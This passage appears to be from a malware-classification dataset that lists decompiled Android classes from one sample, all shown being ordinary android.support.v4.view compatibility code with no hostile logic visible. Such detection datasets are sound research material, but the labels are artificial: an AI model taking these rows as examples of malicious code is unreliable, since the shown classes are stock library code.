provider=AccessibilityDelegateCompatJellyBean.getAccessibilityNodeProvider(delegate,host);       if (provider != null) {         return new AccessibilityNodeProviderCompat(provider);       }       return null;     }     @Override public boolean performAccessibilityAction(    Object delegate,    View host,    int action,    Bundle args){       return AccessibilityDelegateCompatJellyBean.performAccessibilityAction(delegate,host,action,args);     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityDelegateJellyBeanImpl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityDelegateIcsImpl();     }  else {       IMPL=new AccessibilityDelegateStubImpl();     }     DEFAULT_DELEGATE=IMPL.newAccessiblityDelegateDefaultImpl();   }   public Object getBridge(){     return this.mBridge;   }   public void sendAccessibilityEvent(  View host,  int eventType){     IMPL.sendAccessibilityEvent(DEFAULT_DELEGATE,host,eventType);   }   public void sendAccessibilityEventUnchecked(  View host,  AccessibilityEvent event){     IMPL.sendAccessibilityEventUnchecked(DEFAULT_DELEGATE,host,event);   }   public boolean dispatchPopulateAccessibilityEvent(  View host,  AccessibilityEvent event){     return IMPL.dispatchPopulateAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onPopulateAccessibilityEvent(  View host,  AccessibilityEvent event){     IMPL.onPopulateAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onInitializeAccessibilityEvent(  View host,  AccessibilityEvent event){     IMPL.onInitializeAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onInitializeAccessibilityNodeInfo(  View host,  AccessibilityNodeInfoCompat info){     IMPL.onInitializeAccessibilityNodeInfo(DEFAULT_DELEGATE,host,info);   }   public boolean onRequestSendAccessibilityEvent(  ViewGroup host,  View child,  AccessibilityEvent event){     return IMPL.onRequestSendAccessibilityEvent(DEFAULT_DELEGATE,host,child,event);   }   public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View host){     return IMPL.getAccessibilityNodeProvider(DEFAULT_DELEGATE,host);   }   public boolean performAccessibilityAction(  View host,  int action,  Bundle args){     return IMPL.performAccessibilityAction(DEFAULT_DELEGATE,host,action,args);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\AccessibilityDelegateCompatIcs.code","class AccessibilityDelegateCompatIcs { public interface AccessibilityDelegateBridge {     boolean dispatchPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    Object obj);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void sendAccessibilityEvent(    View view,    int i);     void sendAccessibilityEventUnchecked(    View view,    AccessibilityEvent accessibilityEvent);   }   AccessibilityDelegateCompatIcs(){   }   public static Object newAccessibilityDelegateDefaultImpl(){     return new View.AccessibilityDelegate();   }   public static Object newAccessibilityDelegateBridge(  final AccessibilityDelegateBridge bridge){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return AccessibilityDelegateBridge.this.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      AccessibilityNodeInfo info){         AccessibilityDelegateBridge.this.onInitializeAccessibilityNodeInfo(host,info);       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return AccessibilityDelegateBridge.this.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         AccessibilityDelegateBridge.this.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.sendAccessibilityEventUnchecked(host,event);       }     } ;   }   public static boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return ((View.AccessibilityDelegate)delegate).dispatchPopulateAccessibilityEvent(host,event);   }   public static void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).onInitializeAccessibilityEvent(host,event);   }   public static void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  Object info){     ((View.AccessibilityDelegate)delegate).onInitializeAccessibilityNodeInfo(host,(AccessibilityNodeInfo)info);   }   public static void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).onPopulateAccessibilityEvent(host,event);   }   public static boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return ((View.AccessibilityDelegate)delegate).onRequestSendAccessibilityEvent(host,child,event);   }   public static void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){     ((View.AccessibilityDelegate)delegate).sendAccessibilityEvent(host,eventType);   }   public static void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).sendAccessibilityEventUnchecked(host,event);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\AccessibilityDelegateCompatJellyBean.code","class AccessibilityDelegateCompatJellyBean { public interface AccessibilityDelegateBridgeJellyBean {     boolean dispatchPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     Object getAccessibilityNodeProvider(    View view);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    Object obj);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    View view,    int i,    Bundle bundle);     void sendAccessibilityEvent(    View view,    int i);     void sendAccessibilityEventUnchecked(    View view,    AccessibilityEvent accessibilityEvent);   }   AccessibilityDelegateCompatJellyBean(){   }   public static Object newAccessibilityDelegateBridge(  final AccessibilityDelegateBridgeJellyBean bridge){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return AccessibilityDelegateBridgeJellyBean.this.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      AccessibilityNodeInfo info){         AccessibilityDelegateBridgeJellyBean.this.onInitializeAccessibilityNodeInfo(host,info);       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return AccessibilityDelegateBridgeJellyBean.this.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         AccessibilityDelegateBridgeJellyBean.this.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.sendAccessibilityEventUnchecked(host,event);       }       @Override public AccessibilityNodeProvider getAccessibilityNodeProvider(      View host){         return (AccessibilityNodeProvider)AccessibilityDelegateBridgeJellyBean.this.getAccessibilityNodeProvider(host);       }       @Override public boolean performAccessibilityAction(      View host,      int action,      Bundle args){         return AccessibilityDelegateBridgeJellyBean.this.performAccessibilityAction(host,action,args);       }     } ;   }   public static Object getAccessibilityNodeProvider(  Object delegate,  View host){     return ((View.AccessibilityDelegate)delegate).getAccessibilityNodeProvider(host);   }   public static boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return ((View.AccessibilityDelegate)delegate).performAccessibilityAction(host,action,args);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\AccessibilityDelegateIcsImpl.code","static class AccessibilityDelegateIcsImpl extends AccessibilityDelegateStubImpl {   AccessibilityDelegateIcsImpl(){   }   @Override public Object newAccessiblityDelegateDefaultImpl(){     return AccessibilityDelegateCompatIcs.newAccessibilityDelegateDefaultImpl();   }   @Override public Object newAccessiblityDelegateBridge(  final AccessibilityDelegateCompat compat){     return AccessibilityDelegateCompatIcs.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatIcs.AccessibilityDelegateBridge(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return compat.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      Object info){         compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return compat.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         compat.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         compat.sendAccessibilityEventUnchecked(host,event);       }     } );   }   @Override public boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return AccessibilityDelegateCompatIcs.dispatchPopulateAccessibilityEvent(delegate,host,event);   }   @Override public void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.onInitializeAccessibilityEvent(delegate,host,event);   }   @Override public void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  AccessibilityNodeInfoCompat info){     AccessibilityDelegateCompatIcs.onInitializeAccessibilityNodeInfo(delegate,host,info.getInfo());   }   @Override public void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.onPopulateAccessibilityEvent(delegate,host,event);   }   @Override public boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return AccessibilityDelegateCompatIcs.onRequestSendAccessibilityEvent(delegate,host,child,event);   }   @Override public void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){     AccessibilityDelegateCompatIcs.sendAccessibilityEvent(delegate,host,eventType);   }   @Override public void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.sendAccessibilityEventUnchecked(delegate,host,event);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\AccessibilityDelegateImpl.code","public interface AccessibilityDelegateImpl {   boolean dispatchPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object obj,  View view);   Object newAccessiblityDelegateBridge(  AccessibilityDelegateCompat accessibilityDelegateCompat);   Object newAccessiblityDelegateDefaultImpl();   void onInitializeAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  Object obj,  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);   void onPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  Object obj,  View view,  int i,  Bundle bundle);   void sendAccessibilityEvent(  Object obj,  View view,  int i);   void sendAccessibilityEventUnchecked(  Object obj,  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\AccessibilityDelegateJellyBeanImpl.code","static class AccessibilityDelegateJellyBeanImpl extends AccessibilityDelegateIcsImpl {   AccessibilityDelegateJellyBeanImpl(){   }   @Override public Object newAccessiblityDelegateBridge(  final AccessibilityDelegateCompat compat){     return AccessibilityDelegateCompatJellyBean.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatJellyBean.AccessibilityDelegateBridgeJellyBean(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return compat.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      Object info){         compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return compat.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         compat.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         compat.sendAccessibilityEventUnchecked(host,event);       }       @Override public Object getAccessibilityNodeProvider(      View host){         AccessibilityNodeProviderCompat provider=compat.getAccessibilityNodeProvider(host);         if (provider != null) {           return provider.getProvider();         }         return null;       }       @Override public boolean performAccessibilityAction(      View host,      int action,      Bundle args){         return compat.performAccessibilityAction(host,action,args);       }     } );   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object delegate,  View host){     Object provider=AccessibilityDelegateCompatJellyBean.getAccessibilityNodeProvider(delegate,host);     if (provider != null) {       return new AccessibilityNodeProviderCompat(provider);     }     return null;   }   @Override public boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return AccessibilityDelegateCompatJellyBean.performAccessibilityAction(delegate,host,action,args);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\AccessibilityDelegateStubImpl.code","static class AccessibilityDelegateStubImpl implements AccessibilityDelegateImpl {   AccessibilityDelegateStubImpl(){   }   @Override public Object newAccessiblityDelegateDefaultImpl(){     return null;   }   @Override public Object newAccessiblityDelegateBridge(  AccessibilityDelegateCompat listener){     return null;   }   @Override public boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return false;   }   @Override public void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  AccessibilityNodeInfoCompat info){   }   @Override public void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return true;   }   @Override public void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){   }   @Override public void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object delegate,  View host){     return null;   }   @Override public boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\BaseKeyEventVersionImpl.code","static class BaseKeyEventVersionImpl implements KeyEventVersionImpl {   private static final int META_ALL_MASK=247;   private static final int META_MODIFIER_MASK=247;   BaseKeyEventVersionImpl(){   }   private static int metaStateFilterDirectionalModifiers(  int metaState,  int modifiers,  int basic,  int left,  int right){     boolean wantBasic=(modifiers & basic) != 0;     int directional=left | right;     boolean wantLeftOrRight=(modifiers & directional) != 0;     if (wantBasic) {       if (wantLeftOrRight) {         throw new IllegalArgumentException(""bad arguments"");       }       return metaState & (directional ^ (-1));     }     if (wantLeftOrRight) {       return metaState & (basic ^ (-1));     }     return metaState;   }   @Override public int normalizeMetaState(  int metaState){     if ((metaState & 192) != 0) {       metaState|=1;     }     if ((metaState & 48) != 0) {       metaState|=2;     }     return metaState & 247;   }   @Override public boolean metaStateHasModifiers(  int metaState,  int modifiers){     return metaStateFilterDirectionalModifiers(metaStateFilterDirectionalModifiers(normalizeMetaState(metaState) & 247,modifiers,1,64,128),modifiers,2,16,32) == modifiers;   }   @Override public boolean metaStateHasNoModifiers(  int metaState){     return (normalizeMetaState(metaState) & 247) == 0;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\BaseMenuVersionImpl.code","static class BaseMenuVersionImpl implements MenuVersionImpl {   BaseMenuVersionImpl(){   }   @Override public boolean setShowAsAction(  MenuItem item,  int actionEnum){     return false;   } } static class BaseMenuVersionImpl implements MenuVersionImpl {   BaseMenuVersionImpl(){   }   @Override public boolean setShowAsAction(  MenuItem item,  int actionEnum){     return false;   }   @Override public MenuItem setActionView(  MenuItem item,  View view){     return item;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\BaseMotionEventVersionImpl.code","static class BaseMotionEventVersionImpl implements MotionEventVersionImpl {   BaseMotionEventVersionImpl(){   }   @Override public int findPointerIndex(  MotionEvent event,  int pointerId){     return pointerId == 0 ? 0 : -1;   }   @Override public int getPointerId(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return 0;     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float getX(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return event.getX();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float getY(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return event.getY();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\BaseVelocityTrackerVersionImpl.code","static class BaseVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {   BaseVelocityTrackerVersionImpl(){   }   @Override public float getXVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getXVelocity();   }   @Override public float getYVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getYVelocity();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\BaseViewCompatImpl.code","static class BaseViewCompatImpl implements ViewCompatImpl {   BaseViewCompatImpl(){   }   @Override public boolean canScrollHorizontally(  View v,  int direction){     return false;   }   @Override public boolean canScrollVertically(  View v,  int direction){     return false;   }   @Override public int getOverScrollMode(  View v){     return 2;   }   @Override public void setOverScrollMode(  View v,  int mode){   }   @Override public void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){   }   @Override public void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){   }   @Override public boolean hasTransientState(  View view){     return false;   }   @Override public void setHasTransientState(  View view,  boolean hasTransientState){   }   @Override public void postInvalidateOnAnimation(  View view){     view.postInvalidateDelayed(getFrameTime());   }   @Override public void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     view.postInvalidateDelayed(getFrameTime(),left,top,right,bottom);   }   @Override public void postOnAnimation(  View view,  Runnable action){     view.postDelayed(action,getFrameTime());   }   @Override public void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     view.postDelayed(action,getFrameTime() + delayMillis);   }   long getFrameTime(){     return ViewCompat.FAKE_FRAME_TIME;   }   @Override public int getImportantForAccessibility(  View view){     return 0;   }   @Override public void setImportantForAccessibility(  View view,  int mode){   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\BaseViewConfigurationVersionImpl.code","static class BaseViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {   BaseViewConfigurationVersionImpl(){   }   @Override public int getScaledPagingTouchSlop(  ViewConfiguration config){     return config.getScaledTouchSlop();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\Decor.code","interface Decor { } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\EclairMotionEventVersionImpl.code","static class EclairMotionEventVersionImpl implements MotionEventVersionImpl {   EclairMotionEventVersionImpl(){   }   @Override public int findPointerIndex(  MotionEvent event,  int pointerId){     return MotionEventCompatEclair.findPointerIndex(event,pointerId);   }   @Override public int getPointerId(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getPointerId(event,pointerIndex);   }   @Override public float getX(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getX(event,pointerIndex);   }   @Override public float getY(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getY(event,pointerIndex);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\FroyoViewConfigurationVersionImpl.code","static class FroyoViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {   FroyoViewConfigurationVersionImpl(){   }   @Override public int getScaledPagingTouchSlop(  ViewConfiguration config){     return ViewConfigurationCompatFroyo.getScaledPagingTouchSlop(config);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\GBViewCompatImpl.code","static class GBViewCompatImpl extends BaseViewCompatImpl {   GBViewCompatImpl(){   }   @Override public int getOverScrollMode(  View v){     return ViewCompatGingerbread.getOverScrollMode(v);   }   @Override public void setOverScrollMode(  View v,  int mode){     ViewCompatGingerbread.setOverScrollMode(v,mode);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\HCViewCompatImpl.code","static class HCViewCompatImpl extends GBViewCompatImpl {   HCViewCompatImpl(){   }   @Override long getFrameTime(){     return ViewCompatHC.getFrameTime();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\HoneycombKeyEventVersionImpl.code","static class HoneycombKeyEventVersionImpl implements KeyEventVersionImpl {   HoneycombKeyEventVersionImpl(){   }   @Override public int normalizeMetaState(  int metaState){     return KeyEventCompatHoneycomb.normalizeMetaState(metaState);   }   @Override public boolean metaStateHasModifiers(  int metaState,  int modifiers){     return KeyEventCompatHoneycomb.metaStateHasModifiers(metaState,modifiers);   }   @Override public boolean metaStateHasNoModifiers(  int metaState){     return KeyEventCompatHoneycomb.metaStateHasNoModifiers(metaState);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\HoneycombMenuVersionImpl.code","static class HoneycombMenuVersionImpl implements MenuVersionImpl {   HoneycombMenuVersionImpl(){   }   @Override public boolean setShowAsAction(  MenuItem item,  int actionEnum){     MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);     return true;   } } static class HoneycombMenuVersionImpl implements MenuVersionImpl {   HoneycombMenuVersionImpl(){   }   @Override public boolean setShowAsAction(  MenuItem item,  int actionEnum){     MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);     return true;   }   @Override public MenuItem setActionView(  MenuItem item,  View view){     return MenuItemCompatHoneycomb.setActionView(item,view);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\HoneycombVelocityTrackerVersionImpl.code","static class HoneycombVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {   HoneycombVelocityTrackerVersionImpl(){   }   @Override public float getXVelocity(  VelocityTracker tracker,  int pointerId){     return VelocityTrackerCompatHoneycomb.getXVelocity(tracker,pointerId);   }   @Override public float getYVelocity(  VelocityTracker tracker,  int pointerId){     return VelocityTrackerCompatHoneycomb.getYVelocity(tracker,pointerId);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ICSViewCompatImpl.code","static class ICSViewCompatImpl extends HCViewCompatImpl {   ICSViewCompatImpl(){   }   @Override public boolean canScrollHorizontally(  View v,  int direction){     return ViewCompatICS.canScrollHorizontally(v,direction);   }   @Override public boolean canScrollVertically(  View v,  int direction){     return ViewCompatICS.canScrollVertically(v,direction);   }   @Override public void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     ViewCompatICS.onPopulateAccessibilityEvent(v,event);   }   @Override public void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     ViewCompatICS.onInitializeAccessibilityEvent(v,event);   }   @Override public void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){     ViewCompatICS.onInitializeAccessibilityNodeInfo(v,info.getInfo());   }   @Override public void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){     ViewCompatICS.setAccessibilityDelegate(v,delegate.getBridge());   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ItemInfo.code","public static class ItemInfo {   Object object;   float offset;   int position;   boolean scrolling;   float widthFactor;   ItemInfo(){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\JBViewCompatImpl.code","static class JBViewCompatImpl extends ICSViewCompatImpl {   JBViewCompatImpl(){   }   @Override public boolean hasTransientState(  View view){     return ViewCompatJB.hasTransientState(view);   }   @Override public void setHasTransientState(  View view,  boolean hasTransientState){     ViewCompatJB.setHasTransientState(view,hasTransientState);   }   @Override public void postInvalidateOnAnimation(  View view){     ViewCompatJB.postInvalidateOnAnimation(view);   }   @Override public void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     ViewCompatJB.postInvalidateOnAnimation(view,left,top,right,bottom);   }   @Override public void postOnAnimation(  View view,  Runnable action){     ViewCompatJB.postOnAnimation(view,action);   }   @Override public void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     ViewCompatJB.postOnAnimationDelayed(view,action,delayMillis);   }   @Override public int getImportantForAccessibility(  View view){     return ViewCompatJB.getImportantForAccessibility(view);   }   @Override public void setImportantForAccessibility(  View view,  int mode){     ViewCompatJB.setImportantForAccessibility(view,mode);   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     Object compat=ViewCompatJB.getAccessibilityNodeProvider(view);     if (compat != null) {       return new AccessibilityNodeProviderCompat(compat);     }     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\KeyEventCompat.code","public class KeyEventCompat {   static final KeyEventVersionImpl IMPL; interface KeyEventVersionImpl {     boolean metaStateHasModifiers(    int i,    int i2);     boolean metaStateHasNoModifiers(    int i);     int normalizeMetaState(    int i);   } static class BaseKeyEventVersionImpl implements KeyEventVersionImpl {     private static final int META_ALL_MASK=247;     private static final int META_MODIFIER_MASK=247;     BaseKeyEventVersionImpl(){     }     private static int metaStateFilterDirectionalModifiers(    int metaState,    int modifiers,    int basic,    int left,    int right){       boolean wantBasic=(modifiers & basic) != 0;       int directional=left | right;       boolean wantLeftOrRight=(modifiers & directional) != 0;       if (wantBasic) {         if (wantLeftOrRight) {           throw new IllegalArgumentException(""bad arguments"");         }         return metaState & (directional ^ (-1));       }       if (wantLeftOrRight) {         return metaState & (basic ^ (-1));       }       return metaState;     }     @Override public int normalizeMetaState(    int metaState){       if ((metaState & 192) != 0) {         metaState|=1;       }       if ((metaState & 48) != 0) {         metaState|=2;       }       return metaState & 247;     }     @Override public boolean metaStateHasModifiers(    int metaState,    int modifiers){       return metaStateFilterDirectionalModifiers(metaStateFilterDirectionalModifiers(normalizeMetaState(metaState) & 247,modifiers,1,64,128),modifiers,2,16,32) == modifiers;     }     @Override public boolean metaStateHasNoModifiers(    int metaState){       return (normalizeMetaState(metaState) & 247) == 0;     }   } static class HoneycombKeyEventVersionImpl implements KeyEventVersionImpl {     HoneycombKeyEventVersionImpl(){     }     @Override public int normalizeMetaState(    int metaState){       return KeyEventCompatHoneycomb.normalizeMetaState(metaState);     }     @Override public boolean metaStateHasModifiers(    int metaState,    int modifiers){       return 